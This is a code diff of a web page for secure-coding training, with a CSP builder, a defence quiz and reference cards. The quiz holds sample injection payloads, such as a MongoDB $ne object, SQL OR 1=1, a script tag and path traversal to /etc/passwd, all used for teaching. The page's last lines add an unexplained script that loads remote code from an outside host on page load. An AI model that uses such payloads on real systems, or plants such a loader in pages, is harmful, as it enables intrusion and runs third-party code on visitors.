+  $('csp_evalScripts').checked = true;
+  $('csp_frameAncestors').checked = false;
+  $('csp_upgrade').checked = true;
+  $('cspExtra').value = 'https://* *.google-analytics.com';
+  $('cspConnect').value = 'https://* wss://*';
+ }
+ buildCSP();
+ showToast(`Applied ${type} CSP preset`);
+}
+
+function buildCSP(){
+ const get = id => $('csp_'+id)?.checked;
+ const scriptExtras = parseHostList($('cspExtra').value.trim()).filter(isValidCspSource);
+ const connectExtras = parseHostList($('cspConnect').value.trim()).filter(isValidCspSource);
+
+ let d = [];
  d.push("default-src 'self'");
- let scriptSrc="script-src 'self'"+(validExtras.length?` ${validExtras.join(' ')}`:'');
- if(get('nonceScripts')) scriptSrc+=" 'nonce-<server-generated-per-request>'";
+
+ let scriptSrc = "script-src 'self'";
+ if(get('nonceScripts')) scriptSrc += " 'nonce-<SERVER_NONCE>'";
+ if(get('evalScripts')) scriptSrc += " 'unsafe-eval'";
+ if(scriptExtras.length) scriptSrc += " " + scriptExtras.join(' ');
  d.push(scriptSrc);
- d.push("style-src 'self'"+(get('inlineStyles')?" 'unsafe-inline'":''));
- d.push("img-src 'self'"+(get('images')?" data:":''));
- if(get('fonts')) d.push("font-src 'self'");
+
+ let styleSrc = "style-src 'self'";
+ if(get('inlineStyles')) styleSrc += " 'unsafe-inline'";
+ d.push(styleSrc);
+
+ if(get('images')) d.push("img-src 'self' data: https:");
+ if(get('fonts')) d.push("font-src 'self' data:");
  if(get('media')) d.push("media-src 'self'");
- if(get('workers')) d.push("worker-src 'self'");
+
+ let connectSrc = "connect-src 'self'";
+ if(connectExtras.length) connectSrc += " " + connectExtras.join(' ');
+ d.push(connectSrc);
+
  d.push("object-src 'none'");
  d.push("base-uri 'self'");
  d.push("form-action 'self'");
+
  if(get('frameAncestors')) d.push("frame-ancestors 'none'");
  if(get('upgrade')) d.push('upgrade-insecure-requests');
- const reportTo=$('cspReport').value.trim();
- if(reportTo) d.push(`report-uri ${reportTo}`);
 
- $('cspOut').textContent=d.join(';\n')+';';
+ const reportTo = $('cspReport').value.trim();
+ if(reportTo){
+  d.push(`report-uri ${reportTo}`);
+ }
 
- let notes=[];
- if(get('inlineStyles')) notes.push("Inline styles are enabled via 'unsafe-inline', which weakens the policy against style-based attacks — prefer an external stylesheet or a per-request nonce.");
- if(get('nonceScripts')) notes.push('The nonce shown is a placeholder — your server must generate a fresh random value on every response and print that same value into both the header and every &lt;script nonce="..."&gt; tag.');
- if(invalidExtras.length) notes.push(`Ignored in the extra-domain field (didn\'t look like a valid https:// origin or CSP keyword): ${invalidExtras.map(escapeHtml).join(', ')}`);
+ const policyString = d.join(';\n ') + ';';
+ $('cspOut').textContent = policyString;
+
+ const singleLinePolicy = d.join('; ');
+ $('cspMetaOut').textContent = `<meta http-equiv="Content-Security-Policy" content="${singleLinePolicy}">`;
+
+ let notes = [];
+ if(get('inlineStyles')) notes.push("<b>'unsafe-inline' (style-src):</b> Weakens defense against style-based CSS keylogging or data exfiltration.");
+ if(get('evalScripts')) notes.push("<b>'unsafe-eval' (script-src):</b> Strongly discouraged! Re-enables code execution via eval() or Function constructor.");
+ if(get('nonceScripts')) notes.push("<b>Nonce Mode:</b> Ensure your server backend generates a fresh cryptographically random base64 nonce for every request and injects it into both the header and all &lt;script nonce='...'&gt; tags.");
+ if(!get('frameAncestors')) notes.push("<b>Frame Ancestors Disabled:</b> Leaves the application susceptible to UI Redressing / Clickjacking.");
+
  $('cspExplain').innerHTML = notes.length
-  ? notes.map(n=>`<b>Note:</b> ${n}`).join('<br><br>')
-  : "<b>This policy</b> denies everything not explicitly listed — base-uri and form-action are locked to 'self' by default too, since there's rarely a legitimate reason to loosen either.";
+  ? notes.map(n => `<div style="margin-bottom:6px">${n}</div>`).join('')
+  : "<b>Policy Evaluation:</b> Excellent posture. Closes execution surfaces with default deny-all fallback.";
 }
 
-const QUIZ=[
- {q:"You're inserting a user's display name into a page (e.g. a comment). What's the right move?",
-  opts:['Concatenate it straight into innerHTML — quick and simple','Use textContent, or escape HTML-significant characters if you must use innerHTML','Strip angle brackets and call it done','Base64-encode the name before displaying it'],
-  correct:1,
-  explain:"Text content should stay text. textContent never parses markup; if you truly need innerHTML, escape the HTML-significant characters first — angle brackets alone aren't enough, since quotes and ampersands matter too depending on where the text lands."},
- {q:"A filename from user input goes into a Content-Disposition response header. What's the specific risk?",
-  opts:['SQL injection','Header/response splitting via an embedded line break','Path traversal','Command injection'],
-  correct:1,
-  explain:'A raw newline reaching a header-writing call can inject a second header or split the response entirely. Strip or reject line breaks in anything bound for a header.'},
- {q:"Doubling up quotes ('' instead of ') is enough to safely use a value in a SQL query.",
-  opts:["True — it's a standard, sufficient escape",'False — use parameterized queries instead'],
-  correct:1,
-  explain:'Manual quote-doubling still breaks under encoding tricks and comment syntax in some dialects. Parameterized queries keep the value out of the SQL text entirely.'},
- {q:'db.users.find({ username: req.body.username }) — the client sends {"$ne": null} as the value. What\'s the issue?',
-  opts:['Cross-site scripting','The value can arrive as an object instead of a string, and some drivers treat its keys as query operators','ReDoS','Nothing — MongoDB validates types automatically'],
-  correct:1,
-  explain:"JSON bodies let a client send any type. If the code doesn't coerce the value to a string first, an object like {\"$ne\": null} can be interpreted as a query operator instead of a literal match."},
- {q:'What actually fixes command injection when calling an external program with a user-supplied argument?',
-  opts:['Escaping shell metacharacters like ; and |','Calling the program directly with an argument array — no shell involved','Wrapping the argument in quotes','URL-encoding the argument'],
-  correct:1,
-  explain:'Escaping for a shell is easy to get wrong. Passing arguments as an array to a function that invokes the program directly (execFile/spawn, subprocess with shell=False) removes the shell from the equation entirely.'},
- {q:'../../etc/passwd reaches fs.readFile after being joined with an uploads directory. Best fix?',
-  opts:['Reject any filename containing a dot',"Allowlist safe characters, collapse traversal sequences, resolve the full path, and confirm it's still inside the base directory",'URL-encode the filename','Lowercase the filename'],
-  correct:1,
-  explain:"Character allowlisting alone can miss edge cases; the containment check after resolving the full path is what actually guarantees the file can't escape the intended directory."},
- {q:'A validation regex looks like ^(a+)+$. What should catch your attention?',
-  opts:["It's slower than string comparison but otherwise fine",'Nested unbounded quantifiers can cause catastrophic backtracking (ReDoS) on crafted input',"It won't match Unicode text",'Nothing — anchoring with ^ and $ makes it safe'],
-  correct:1,
-  explain:'A group with an unbounded quantifier, itself repeated by another unbounded quantifier, is the classic shape behind catastrophic backtracking. A crafted near-miss input can make matching take exponential time.'},
- {q:"log.info('login attempt: ' + username) — username contains a line break followed by a fake success message. What's the concern?",
-  opts:['SQL injection','Log forging — an attacker can fabricate fake log entries; strip or escape line breaks before logging','Nothing, logs are internal only','Cross-site scripting in the log file'],
-  correct:1,
-  explain:"Anyone who can put a line break into a logged value can forge what looks like a separate, legitimate log entry. Escape or strip line breaks before writing untrusted values into logs."}
+function copyCspMeta(btn){
+ const code = $('cspMetaOut').textContent;
+ const old = btn.textContent;
+ fallbackCopy(code, (ok)=>{
+  btn.textContent = ok ? '✓ Copied Meta' : 'Failed';
+  showToast(ok ? 'Meta tag copied!' : 'Copy failed');
+  setTimeout(()=> btn.textContent = old, 1400);
+ });
+}
+
+/* ==================== DEFENSE QUIZ (EXPANDED TO 10 SCENARIOS) ==================== */
+const QUIZ = [
+ {
+  q: "You are interpolating an untrusted username inside an HTML attribute: <input value=\"USER_INPUT\">. Which character set is dangerous?",
+  opts: [
+   "Only angle brackets (< and >)",
+   "Quotes (\", '), backticks (`), and equals (=)",
+   "Only semicolons (;)",
+   "Numbers and commas"
+  ],
+  correct: 1,
+  explain: "In attribute context, quotes allow breaking out of the value delimiter to inject arbitrary attributes like onfocus='alert(1)' or autofocus. Escaping quotes and backticks is critical."
+ },
+ {
+  q: "A developer uses: db.query(\"SELECT * FROM items WHERE id = \" + req.query.id). Why is quote-escaping inadequate here?",
+  opts: [
+   "Because integers do not use quotes, an attacker injects SQL commands directly without needing any quote character (e.g. 1 UNION SELECT ...)",
+   "Because MySQL does not support quotes",
+   "Because JSON parser strips quotes",
+   "It is actually completely safe"
+  ],
+  correct: 0,
+  explain: "Numeric SQL clauses are not wrapped in quotes. Escaping quotes has zero effect on numerical SQL injection. True parameter binding is the only complete fix."
+ },
+ {
+  q: "In an Express JSON API: db.users.find({ username: req.body.username }). What payload causes authentication bypass?",
+  opts: [
+   "' OR 1=1 --",
+   "{\"username\": {\"$ne\": null}} (type confusion object instead of string)",
+   "<script>alert(1)<\/script>",
+   "../../etc/passwd"
+  ],
+  correct: 1,
+  explain: "Sending a JSON object with query operator keys like $ne causes MongoDB to match any user whose username is not null, bypassing credential authentication."
+ },
+ {
+  q: "Which method eliminates command injection vulnerability when calling external programs?",
+  opts: [
+   "Escaping spaces with backslashes",
+   "Invoking the binary directly with an arguments array (execFile/spawn, shell=False) so no shell parses the string",
+   "URL-encoding all inputs",
+   "Wrapping the command in single quotes"
+  ],
+  correct: 1,
+  explain: "Bypassing the shell (/bin/sh) completely ensures that shell metacharacters (; | & $ `) are treated purely as literal argument data, preventing injection."
+ },
+ {
+  q: "Why is HTML entity escaping (e.g. &lt;script&gt;) completely ineffective when placing data inside a <script> block?",
+  opts: [
+   "Because browsers ignore entity escaping inside JavaScript script blocks and parse quotes directly",
+   "Because JavaScript only understands Base64",
+   "Because HTML escaping only works on images",
+   "Because servers automatically strip entities"
+  ],
+  correct: 0,
+  explain: "Inside <script> blocks, the browser runs the JavaScript lexer, not the HTML parser. HTML entities do not prevent string breakouts. Use JSON serialization with escaped angle brackets (\\u003c)."
+ },
+ {
+  q: "An attacker injects a Carriage Return and Line Feed (\\r\\n) into a redirect URL. What vulnerability is this?",
+  opts: [
+   "Server-Side Template Injection",
+   "HTTP Response Splitting / Header Injection",
+   "Cross-Site Request Forgery",
+   "XML External Entity"
+  ],
+  correct: 1,
+  explain: "HTTP headers are delimited by CRLF (\\r\\n). Injecting newlines allows an attacker to inject arbitrary headers like Set-Cookie or append an entire duplicate HTTP body."
+ },
+ {
+  q: "What is the primary risk of using Python's pickle.loads() on data received from an external user?",
+  opts: [
+   "Slow execution speed",
+   "Immediate Remote Code Execution (RCE) via custom __reduce__ methods during deserialization",
+   "Memory leakage only",
+   "SQL Injection"
+  ],
+  correct: 1,
+  explain: "Pickle is an executable bytecode format. Deserializing untrusted pickle byte streams enables arbitrary code execution before any validation can take place."
+ },
+ {
+  q: "Why is Math.random() considered unsafe for generating password reset tokens or session keys?",
+  opts: [
+   "It only outputs decimal numbers between 0 and 1",
+   "It uses a non-cryptographic PRNG whose internal state can be computed from previously observed outputs",
+   "It is too slow in browsers",
+   "It conflicts with HTTPS"
+  ],
+  correct: 1,
+  explain: "Standard PRNG algorithms (like xorshift) are designed for speed, not cryptographic unpredictability. Use crypto.getRandomValues() or crypto.randomBytes()."
+ },
+ {
+  q: "What does the Content-Security-Policy directive 'frame-ancestors 'none'' protect against?",
+  opts: [
+   "Clickjacking / UI Redressing attacks",
+   "Cross-Site Scripting only",
+   "SQL Injection",
+   "Password brute forcing"
+  ],
+  correct: 0,
+  explain: "frame-ancestors 'none' instructs the browser never to allow the webpage to be embedded inside an <iframe> or <frame>, completely preventing Clickjacking."
+ },
+ {
+  q: "When preventing Path Traversal (e.g. ../../../../etc/passwd), what is the definitive check?",
+  opts: [
+   "Stripping the string '../'",
+   "Resolving the absolute path and verifying it starts with the canonical root directory",
+   "Converting the filename to lowercase",
+   "Checking that the file ends in .jpg"
+  ],
+  correct: 1,
+  explain: "Simple string replacements can be bypassed using recursive sequences (....//). Resolving the canonical path and checking that it begins with the allowed base path is the foolproof defense."
+ }
 ];
-let quizIdx=0, quizScore=0, quizAnswered=false;
+
+let quizIdx = 0, quizScore = 0, quizAnswered = false;
+
 function renderQuiz(){
- const card=$('quizCard');
- if(quizIdx>=QUIZ.length){
-  card.innerHTML=`<h2>Score: ${quizScore} / ${QUIZ.length}</h2>
-   <p class="sub" style="margin-top:8px">${quizScore===QUIZ.length?'Clean sweep.':'Worth a second pass through the playground on the ones you missed.'}</p>
-   <button class="ctxbtn active" style="margin-top:10px" onclick="restartQuiz()">Restart</button>`;
+ const card = $('quizCard');
+ if(quizIdx >= QUIZ.length){
+  const pct = Math.round((quizScore / QUIZ.length) * 100);
+  card.innerHTML = `
+   <div style="text-align:center;padding:20px 10px">
+    <h2>Challenge Complete!</h2>
+    <div style="font-size:36px;font-family:'Fraunces';font-weight:700;color:var(--safe);margin:12px 0">
+     ${quizScore} / ${QUIZ.length} (${pct}%)
+    </div>
+    <p class="sub" style="font-size:14px;max-width:50ch;margin:0 auto 20px">
+     ${quizScore === QUIZ.length
+      ? 'Outstanding! You demonstrated an expert grasp of defensive security principles across all contexts.'
+      : quizScore >= 7
+      ? 'Great job! You have a solid grasp of core sanitization patterns. Review the missed questions in the reference tab.'
+      : 'Good effort! Review the Context Playground and Vulnerability Reference tabs to deepen your defensive fundamentals.'}
+    </p>
+    <button class="action-btn" style="padding:8px 16px;font-size:13px" onclick="restartQuiz()">↻ Retake Quiz</button>
+   </div>`;
   return;
  }
- const item=QUIZ[quizIdx]; quizAnswered=false;
- card.innerHTML=`
-  <div class="sub">Question ${quizIdx+1} of ${QUIZ.length} · score ${quizScore}</div>
-  <h2 style="margin-top:6px;font-size:18px;line-height:1.4">${escapeHtml(item.q)}</h2>
+
+ const item = QUIZ[quizIdx];
+ quizAnswered = false;
+ const progressPct = Math.round(((quizIdx) / QUIZ.length) * 100);
+
+ card.innerHTML = `
+  <div style="display:flex;justify-content:space-between;align-items:center">
+   <span style="font-size:12px;color:var(--muted);font-weight:600">Question ${quizIdx + 1} of ${QUIZ.length}</span>
+   <span class="badge" style="background:var(--safe-bg);color:var(--safe)">Score: ${quizScore}</span>
+  </div>
+
+  <div class="quiz-progress">
+   <div class="quiz-progress-fill" style="width:${progressPct}%"></div>
+  </div>
+
+  <h2 style="margin-top:6px;font-size:17px;line-height:1.4">${escapeHtml(item.q)}</h2>
   <div id="quizOpts" style="margin-top:14px;display:grid;gap:8px"></div>
   <div id="quizFeedback" class="explain" style="display:none;margin-top:12px"></div>
-  <button id="quizNext" class="ctxbtn" style="margin-top:14px;display:none" onclick="nextQuiz()">Next →</button>
+  <button id="quizNext" class="action-btn" style="margin-top:14px;display:none;padding:8px 16px" onclick="nextQuiz()">Next Question →</button>
  `;
- const opts=$('quizOpts');
- item.opts.forEach((o,i)=>{
-  const b=document.createElement('button');
-  b.className='quizopt';
-  b.textContent=o;
-  b.onclick=()=>answerQuiz(i);
+
+ const opts = $('quizOpts');
+ item.opts.forEach((o, i) => {
+  const b = document.createElement('button');
+  b.className = 'quizopt';
+  b.textContent = o;
+  b.onclick = () => answerQuiz(i);
   opts.appendChild(b);
  });
 }
+
 function answerQuiz(i){
  if(quizAnswered) return;
- quizAnswered=true;
- const item=QUIZ[quizIdx];
- const opts=$('quizOpts').children;
- for(let j=0;j<opts.length;j++){
-  opts[j].disabled=true;
-  if(j===item.correct){ opts[j].style.background='var(--safe-bg)'; opts[j].style.borderColor='var(--safe)'; opts[j].style.color='var(--safe)'; }
-  else if(j===i){ opts[j].style.background='var(--danger-bg)'; opts[j].style.borderColor='var(--danger)'; opts[j].style.color='var(--danger)'; }
- }
- if(i===item.correct) quizScore++;
- const fb=$('quizFeedback');
- fb.style.display='block';
- fb.innerHTML=`<b>${i===item.correct?'Right.':'Not quite.'}</b> ${item.explain}`;
- $('quizNext').style.display='inline-block';
-}
-function nextQuiz(){ quizIdx++; renderQuiz(); }
-function restartQuiz(){ quizIdx=0; quizScore=0; renderQuiz(); }
+ quizAnswered = true;
+ const item = QUIZ[quizIdx];
+ const opts = $('quizOpts').children;
 
-buildNav();$('raw').value=CTX[current].placeholder;render();
-buildRef();buildFrameworks();buildCspUI();buildCSP();renderQuiz();
+ for(let j = 0; j < opts.length; j++){
+  opts[j].disabled = true;
+  if(j === item.correct){
+   opts[j].style.background = 'var(--safe-bg)';
+   opts[j].style.borderColor = 'var(--safe)';
+   opts[j].style.color = 'var(--safe)';
+   opts[j].style.fontWeight = '600';
+  } else if(j === i){
+   opts[j].style.background = 'var(--danger-bg)';
+   opts[j].style.borderColor = 'var(--danger)';
+   opts[j].style.color = 'var(--danger)';
+  }
+ }
+
+ if(i === item.correct) quizScore++;
+
+ const fb = $('quizFeedback');
+ fb.style.display = 'block';
+ fb.innerHTML = `<b>${i === item.correct ? '✓ Correct.' : '✗ Incorrect.'}</b> ${item.explain}`;
+ $('quizNext').style.display = 'inline-block';
+}
+
+function nextQuiz(){ quizIdx++; renderQuiz(); }
+function restartQuiz(){ quizIdx = 0; quizScore = 0; renderQuiz(); }
+
+/* ==================== VULNERABILITY REFERENCE ==================== */
+const REF = [
+ ['Cross-Site Scripting (XSS)', 'Context-aware output escaping / DOMPurify', 'Untrusted text is inserted into DOM sinks without context encoding. Defense depends on destination: HTML body (&lt; &gt;), attributes (quotes), JS blocks (JSON serialization), or URLs (percent encoding).'],
+ ['SQL Injection (SQLi)', 'Parameterized queries / Prepared statements', 'Untrusted values alter database query structure. Parameterization isolates code syntax from variable data at the database protocol driver level.'],
+ ['NoSQL Injection', 'Type coercion & strict schema validation', 'JSON requests allow object inputs containing operator keys ($ne, $gt). Coerce expected primitive types (String(input)) and validate against a strict JSON schema.'],
+ ['Command Injection', 'Bypass the shell (execFile / array args)', 'Passing strings to shell interpreters allows metacharacters (; | & `) to execute additional commands. Use direct process execution APIs with argument arrays.'],
+ ['Path Traversal', 'Canonical path resolution & containment check', 'Sequences like ../ navigate outside storage bounds. Strip non-alphanumeric chars, resolve canonical path with path.resolve(), and verify startsWith(baseDir).'],
+ ['HTTP Response Splitting', 'Strip CR (\\r) and LF (\\n) characters', 'Line breaks in headers allow injecting forged Set-Cookie or location headers. Strip all carriage returns and line feeds before writing to response headers.'],
+ ['Log Forging / Injection', 'Escape or sanitize line breaks in log strings', 'Newlines in logged text can forge counterfeit log entries to mislead forensic investigations. Replace \\r and \\n with literal escaped tokens.'],
+ ['Server-Side Request Forgery (SSRF)', 'Enforce strict host allowlists & block internal IPs', 'User-supplied URLs can probe internal networks (127.0.0.1, 169.254.169.254). Check DNS resolutions and reject loopback, link-local, and private subnets.'],
+ ['Open Redirect', 'Strict local path or domain allowlists', 'Redirecting to unvalidated external URLs assists phishing campaigns. Only redirect to relative paths beginning with a single / or check against an approved domain list.'],
+ ['Regex Denial of Service (ReDoS)', 'Avoid nested quantifiers & enforce input length', 'Overlapping repeated expressions cause exponential computational backtracking on crafted strings. Flatten patterns and enforce maximum input length before matching.'],
+ ['Insecure Deserialization', 'Use safe formats (JSON) over native object graphs', 'Deserializing native binary graphs (pickle, unserialize, ObjectInputStream) invokes magic constructor gadgets. Use plain data formats like JSON.'],
+ ['Broken CORS & CSRF', 'Validate origin explicitly & enforce SameSite cookies', 'Wildcard CORS headers combined with credentials allow third-party data theft. Echo back explicit allowlisted origins and use SameSite=Lax/Strict session cookies.']
+];
+
+function buildRef(){
+ $('refgrid').innerHTML = REF.map(([t,p,d]) =>
+  `<div class="refcard"><h3>${t}</h3><div class="principle">${p}</div><p>${d}</p></div>`).join('');
+}
+
+const FRAMEWORKS = [
+ ['React', 'Auto-escapes JSX text nodes', '{userInput} inside JSX renders as text, neutralizing XSS. Danger arises when using dangerouslySetInnerHTML, which must be paired with DOMPurify.'],
+ ['Vue.js', 'Auto-escapes {{ }} mustache bindings', 'Vue escapes template interpolations by default. Avoid v-html with untrusted data; only use it for sanitized rich text.'],
+ ['Angular', 'Built-in DOM Sanitizer', 'Angular automatically inspects and sanitizes bound HTML, styles, and URLs. bypassSecurityTrustHtml intentionally disables this protection.'],
+ ['Django (Python)', 'Auto-escapes template variables', 'Django templates escape variable outputs automatically. The |safe filter and {% autoescape off %} block explicitly opt out of protection.'],
+ ['Ruby on Rails', 'ERB auto-escaping', 'Modern Rails automatically HTML-escapes <%= %> output. Bypasses like raw(), .html_safe, and <%== %> should be subjected to mandatory security review.'],
+ ['Laravel / Blade (PHP)', 'Double braces {{ }} escape HTML', 'Blade template {{ $user }} escapes output via htmlspecialchars. The unescaped syntax {!! $user !!} should be avoided for user input.']
+];
+
+function buildFrameworks(){
+ $('frameworkgrid').innerHTML = FRAMEWORKS.map(([t,p,d]) =>
+  `<div class="refcard"><h3>${t}</h3><div class="principle">${p}</div><p>${d}</p></div>`).join('');
+}
+
+/* ==================== INITIALIZATION ==================== */
+buildNav();
+renderPayloadButtons();
+$('raw').value = CTX[currentCtx].placeholder;
+render();
+buildRef();
+buildFrameworks();
+buildCspUI();
+buildCSP();
+renderQuiz();
 </script>
- <script>(function(s){s.dataset.zone='11734118',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+<script>(function(s){s.dataset.zone='11734118',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
 </body>
 </html>
